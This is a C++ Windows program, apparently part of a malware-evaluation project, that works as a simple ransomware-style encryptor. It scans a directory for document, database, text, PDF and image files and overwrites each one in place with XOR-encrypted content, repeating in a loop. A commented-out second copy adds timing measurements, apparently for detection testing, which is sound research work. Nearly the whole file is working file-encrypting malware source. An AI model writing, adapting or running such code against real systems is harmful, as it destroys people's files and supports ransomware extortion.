#include <iostream>
#include <string>
#include <vector>
#include <Windows.h>
#include <fstream> // For file operations
#include <algorithm> // For std::transform

// Function to perform a simple XOR encryption/decryption
void xorEncryptDecrypt(char* data, size_t size, const char* key, size_t keyLen) {
	if (keyLen == 0) return;
	for (size_t i = 0; i < size; ++i) {
		data[i] ^= key[i % keyLen];
	}
}

// Function to encrypt files
void encryptFiles(const std::wstring& directoryPath, const std::vector<std::wstring>& targetExtensions) {
	std::wcout << L"[*] Starting file encryption in: " << directoryPath << L"\n";

	WIN32_FIND_DATAW findFileData;
	HANDLE hFind = FindFirstFileW((directoryPath + L"\\*").c_str(), &findFileData);

	if (hFind == INVALID_HANDLE_VALUE) {
		std::wcerr << L"Error: Could not open directory " << directoryPath << L" Error: " << GetLastError() << L"\n";
		return;
	}

	const char encryptionKey[] = "MySuperSecretKey123"; // Simple key for demonstration
	size_t keyLength = strlen(encryptionKey);

	do {
		// Skip directories and current/parent directory entries
		if (findFileData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) {
			continue;
		}

		std::wstring fileName = findFileData.cFileName;
		std::wstring fileExtension;

		// Extract file extension
		size_t dotPos = fileName.rfind(L'.');
		if (dotPos != std::wstring::npos) {
			fileExtension = fileName.substr(dotPos);
			// Convert to lowercase for case-insensitive comparison
			std::transform(fileExtension.begin(), fileExtension.end(), fileExtension.begin(), ::tolower);
		}

		// Check if the file extension is in our target list
		bool encryptFile = false;
		for (const auto& ext : targetExtensions) {
			if (fileExtension == ext) {
				encryptFile = true;
				break;
			}
		}

		if (encryptFile) {
			std::wstring fullFilePath = directoryPath + L"\\" + fileName;
			std::wcout << L"  [+] Encrypting: " << fullFilePath << L"\n";

			HANDLE hFile = CreateFileW(
				fullFilePath.c_str(),
				GENERIC_READ | GENERIC_WRITE,
				0, // No sharing
				NULL,
				OPEN_EXISTING,
				FILE_ATTRIBUTE_NORMAL,
				NULL
			);

			if (hFile == INVALID_HANDLE_VALUE) {
				std::wcerr << L"    Error opening file " << fullFilePath << L". Error: " << GetLastError() << L"\n";
				continue;
			}

			DWORD fileSize = GetFileSize(hFile, NULL);
			if (fileSize == INVALID_FILE_SIZE) {
				std::wcerr << L"    Error getting file size for " << fullFilePath << L". Error: " << GetLastError() << L"\n";
				CloseHandle(hFile);
				continue;
			}

			// Allocate buffer for file content
			char* fileBuffer = new (std::nothrow) char[fileSize];
			if (!fileBuffer) {
				std::wcerr << L"    Memory allocation failed for file: " << fullFilePath << L"\n";
				CloseHandle(hFile);
				continue;
			}

			DWORD bytesRead;
			if (!ReadFile(hFile, fileBuffer, fileSize, &bytesRead, NULL) || bytesRead != fileSize) {
				std::wcerr << L"    Error reading file " << fullFilePath << L". Error: " << GetLastError() << L"\n";
				delete[] fileBuffer;
				CloseHandle(hFile);
				continue;
			}

			// Perform encryption
			xorEncryptDecrypt(fileBuffer, fileSize, encryptionKey, keyLength);

			// Set file pointer back to the beginning to overwrite
			SetFilePointer(hFile, 0, NULL, FILE_BEGIN);

			DWORD bytesWritten;
			if (!WriteFile(hFile, fileBuffer, fileSize, &bytesWritten, NULL) || bytesWritten != fileSize) {
				std::wcerr << L"    Error writing encrypted data to file " << fullFilePath << L". Error: " << GetLastError() << L"\n";
			}
			else {
				std::wcout << L"    Successfully encrypted " << fullFilePath << L"\n";
			}

			delete[] fileBuffer;
			CloseHandle(hFile);
		}

	} while (FindNextFileW(hFind, &findFileData) != 0);

	FindClose(hFind);
	std::wcout << L"[*] File encryption complete.\n";
}

int main()
{
	// Define the target directory for encryption
	// IMPORTANT: Replace "C:\\Users\\User\\Documents\\MalwareAnalysis\\MalwareEvaluation-main\\ClipboardLogger\\Debug\\Files"
	// with an actual path on your system where you have test files.
	// Create some dummy files with the target extensions in this directory for testing.
	std::wstring targetDirectory = L"C:\\Users\\User\\Documents\\MalwareAnalysis\\MalwareEvaluation-main\\ClipboardLogger\\Debug\\Files";

	// Define target file extensions (lowercase for consistent comparison)
	std::vector<std::wstring> extensionsToEncrypt = {
		L".docx", L".xlsx", L".db", L".txt", L".pdf", L".jpg"
	};

	std::string value;
	while (true)
	{
		// Output the current process Id
		HANDLE currentThread = GetCurrentThread();
		std::cout << "Process id: ";
		std::cout << GetProcessIdOfThread(currentThread);
		std::cout << "\n";
		CloseHandle(currentThread);

		std::cout << "Press <enter> to Beep (Ctrl-C to exit): ";
		std::getline(std::cin, value);
		Beep(500, 500);

		// Perform file encryption
		encryptFiles(targetDirectory, extensionsToEncrypt);
	}
	return 0;
}



/*
#include <iostream>
#include <string>
#include <vector>
#include <Windows.h>
#include <fstream> // For file operations
#include <algorithm> // For std::transform
#include <chrono>

// Function to perform a simple XOR encryption/decryption
void xorEncryptDecrypt(char* data, size_t size, const char* key, size_t keyLen) {
	if (keyLen == 0) return;
	for (size_t i = 0; i < size; ++i) {
		data[i] ^= key[i % keyLen];
	}
}

// Function to encrypt files
void encryptFiles(const std::wstring& directoryPath, const std::vector<std::wstring>& targetExtensions) {
	std::wcout << L"[*] Starting file encryption in: " << directoryPath << L"\n";

	WIN32_FIND_DATAW findFileData;
	HANDLE hFind = FindFirstFileW((directoryPath + L"\\*").c_str(), &findFileData);

	if (hFind == INVALID_HANDLE_VALUE) {
		std::wcerr << L"Error: Could not open directory " << directoryPath << L" Error: " << GetLastError() << L"\n";
		return;
	}

	const char encryptionKey[] = "MySuperSecretKey123";
	size_t keyLength = strlen(encryptionKey);

	int attemptCount = 0;
	double totalMicroseconds = 0.0;

	do {
		if (findFileData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)
			continue;

		std::wstring fileName = findFileData.cFileName;
		std::wstring fileExtension;
		size_t dotPos = fileName.rfind(L'.');

		if (dotPos != std::wstring::npos) {
			fileExtension = fileName.substr(dotPos);
			std::transform(fileExtension.begin(), fileExtension.end(), fileExtension.begin(), ::tolower);
		}

		bool encryptFile = false;
		for (const auto& ext : targetExtensions) {
			if (fileExtension == ext) {
				encryptFile = true;
				break;
			}
		}

		if (encryptFile) {
			std::wstring fullFilePath = directoryPath + L"\\" + fileName;
			std::wcout << L"  [+] Encrypting: " << fullFilePath << L"\n";

			auto start = std::chrono::high_resolution_clock::now();

			HANDLE hFile = CreateFileW(
				fullFilePath.c_str(),
				GENERIC_READ | GENERIC_WRITE,
				0,
				NULL,
				OPEN_EXISTING,
				FILE_ATTRIBUTE_NORMAL,
				NULL
			);

			if (hFile == INVALID_HANDLE_VALUE) {
				std::wcerr << L"    Error opening file " << fullFilePath << L". Error: " << GetLastError() << L"\n";
				continue;
			}

			DWORD fileSize = GetFileSize(hFile, NULL);
			if (fileSize == INVALID_FILE_SIZE) {
				std::wcerr << L"    Error getting file size for " << fullFilePath << L". Error: " << GetLastError() << L"\n";
				CloseHandle(hFile);
				continue;
			}

			char* fileBuffer = new (std::nothrow) char[fileSize];
			if (!fileBuffer) {
				std::wcerr << L"    Memory allocation failed for file: " << fullFilePath << L"\n";
				CloseHandle(hFile);
				continue;
			}

			DWORD bytesRead;
			if (!ReadFile(hFile, fileBuffer, fileSize, &bytesRead, NULL) || bytesRead != fileSize) {
				std::wcerr << L"    Error reading file " << fullFilePath << L". Error: " << GetLastError() << L"\n";
				delete[] fileBuffer;
				CloseHandle(hFile);
				continue;
			}

			xorEncryptDecrypt(fileBuffer, fileSize, encryptionKey, keyLength);

			SetFilePointer(hFile, 0, NULL, FILE_BEGIN);

			DWORD bytesWritten;
			bool writeSuccess = WriteFile(hFile, fileBuffer, fileSize, &bytesWritten, NULL) && (bytesWritten == fileSize);

			auto end = std::chrono::high_resolution_clock::now();
			std::chrono::duration<double, std::micro> duration = end - start;
			totalMicroseconds += duration.count();
			attemptCount++;

			if (writeSuccess) {
				std::wcout << L"    Successfully encrypted " << fullFilePath << L" (Time: " << duration.count() << L" µs)\n";
			}
			else {
				std::wcerr << L"    Error writing encrypted data to file " << fullFilePath << L". Error: " << GetLastError() << L"\n";
			}

			delete[] fileBuffer;
			CloseHandle(hFile);
		}

	} while (FindNextFileW(hFind, &findFileData) != 0);

	FindClose(hFind);

	if (attemptCount > 0) {
		double avgTime = totalMicroseconds / attemptCount;
		std::wcout << L"[*] Total files attempted: " << attemptCount << std::endl;
		std::wcout << L"[*] Total time spent: " << totalMicroseconds << L" µs" << std::endl;
		std::wcout << L"[*] Average time per attempt: " << avgTime << L" µs" << std::endl;
	}
	else {
		std::wcout << L"[!] No matching files to process.\n";
	}
}


int main()
{
	// Define the target directory for encryption
	// IMPORTANT: Replace "C:\\Users\\User\\Documents\\MalwareAnalysis\\MalwareEvaluation-main\\ClipboardLogger\\Debug\\Files"
	// with an actual path on your system where you have test files.
	// Create some dummy files with the target extensions in this directory for testing.
	std::wstring targetDirectory = L"C:\\Users\\User\\Documents\\MalwareAnalysis\\MalwareEvaluation-main\\ClipboardLogger\\Debug\\Files";

	// Define target file extensions (lowercase for consistent comparison)
	std::vector<std::wstring> extensionsToEncrypt = {
		L".docx", L".xlsx", L".db", L".txt", L".pdf", L".jpg"
	};

	std::string value;
	while (true)
	{
		// Output the current process Id
		HANDLE currentThread = GetCurrentThread();
		std::cout << "Process id: ";
		std::cout << GetProcessIdOfThread(currentThread);
		std::cout << "\n";
		CloseHandle(currentThread);

		std::cout << "Press <enter> to Beep (Ctrl-C to exit): ";
		std::getline(std::cin, value);
		Beep(500, 500);

		// Perform file encryption
		encryptFiles(targetDirectory, extensionsToEncrypt);
	}
	return 0;
}
*/